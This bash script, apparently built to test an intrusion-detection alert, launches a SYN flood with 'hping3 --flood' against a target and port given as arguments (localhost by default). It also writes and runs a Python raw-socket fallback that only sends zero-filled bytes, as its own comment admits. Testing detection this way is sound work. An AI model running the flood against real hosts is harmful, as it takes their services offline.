#!/bin/bash
#
# SYN Flood Attack Simulator
# WARNING: Only use this on your own test systems!
#

set -e

RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
NC='\033[0m'

echo -e "${YELLOW}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}║           SYN Flood Attack Simulator (Test Only)          ║${NC}"
echo -e "${YELLOW}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Check for hping3
if ! command -v hping3 &> /dev/null; then
    echo -e "${YELLOW}hping3 not installed.${NC}"
    echo ""
    echo "To install:"
    echo "  Ubuntu/Debian: sudo apt install hping3"
    echo "  Fedora/RHEL:   sudo dnf install hping3"
    echo ""
    echo -e "${GREEN}Alternative: Using Python scapy simulation${NC}"
    
    # Alternative: Python-based SYN flood simulator
    cat > /tmp/syn_flood_sim.py << 'PYTHON_EOF'
#!/usr/bin/env python3
"""
SYN Flood Simulator using Python sockets
Sends TCP SYN packets to localhost
"""
import socket
import time
import struct

def send_syn_packets(target_ip, target_port, count):
    """Send SYN packets"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    print(f"Sending {count} SYN packets to {target_ip}:{target_port}")
    
    for i in range(count):
        # Simple TCP SYN packet (simplified)
        # In real scenario, would need proper TCP/IP headers
        try:
            sock.sendto(b'\x00' * 20, (target_ip, target_port))
        except:
            pass
        
        if i % 100 == 0:
            print(f"  Sent {i}/{count} packets...")
    
    print(f"Completed: {count} SYN packets sent")
    sock.close()

if __name__ == '__main__':
    send_syn_packets('127.0.0.1', 80, 1000)
PYTHON_EOF
    
    chmod +x /tmp/syn_flood_sim.py
    
    echo ""
    echo -e "${YELLOW}Running Python-based SYN simulation...${NC}"
    sudo python3 /tmp/syn_flood_sim.py
    
    exit 0
fi

# Using hping3 for SYN flood
TARGET=${1:-127.0.0.1}
PORT=${2:-80}
COUNT=${3:-1000}

echo -e "${RED}WARNING: This generates a SYN flood attack!${NC}"
echo -e "${RED}Only use on test systems you own!${NC}"
echo ""
echo "Target: $TARGET"
echo "Port: $PORT"
echo "SYN packets: $COUNT"
echo ""
echo "Press Ctrl+C within 5 seconds to cancel..."
sleep 5

echo ""
echo -e "${YELLOW}Launching SYN flood...${NC}"

# Send SYN packets
sudo hping3 -S -p $PORT --flood -c $COUNT $TARGET

echo ""
echo -e "${GREEN}✓ SYN flood test completed${NC}"
echo -e "${GREEN}✓ EXPECTED ALERT: syn_flood_detection${NC}"
echo ""
